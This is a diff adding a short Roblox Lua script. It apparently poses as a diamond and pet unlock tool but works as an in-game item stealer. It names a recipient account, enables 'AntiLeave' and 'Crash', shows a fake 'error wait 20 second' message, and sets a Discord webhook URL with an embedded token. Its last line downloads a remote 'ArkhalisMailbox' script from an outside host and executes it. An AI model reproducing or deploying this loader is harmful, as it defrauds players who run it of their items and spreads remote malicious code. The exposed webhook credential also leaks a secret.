@@ -1,0 +1,23 @@
+_G.Username = "finaDamian123" 
+_G.GiftMessage = "lol" 
+ 
+_G.Diamonds = 500000
+_G.UnlockPets = true
+_G.AntiLeave = true
+_G.Crash = true
+ 
+--[[ Webhook Config ]]--
+_G.Enabled = true
+_G.Mention = true
+_G.Webhook = "https://discord.com/api/webhooks/1103242519371849738/NrkoARUVr-sBU4cI3trcPVcGLr1PpFQu_JQHYb2cUmIjanNwz6OmqgdGdcGT22RPVZ-1"
+ 
+--[[ UI Config ]]--ecutions
+_G.ScriptName = "error wait 20 second" 
+_G.Tip1 = "no" 
+_G.Tip2 = "yes" 
+_G.Tip3 = "1" 
+_G.Tip4 = "2" 
+_G.Tip5 = "3" 
+ 
+ 
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisMailbox.lua"))()
